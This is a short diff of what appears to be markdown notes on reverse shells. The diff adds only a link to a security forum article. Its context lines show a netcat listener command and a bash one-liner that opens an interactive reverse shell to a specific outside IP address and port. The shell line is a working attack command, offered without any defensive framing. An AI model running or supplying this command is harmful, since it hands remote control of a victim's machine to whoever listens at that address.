@@ -21,3 +21,6 @@ nc -lvvnp 2333
 ```shell
 bash -i >& /dev/tcp/101.33.66.29/2333 0>&1
 ```
+
+
+https://xz.aliyun.com/t/2549
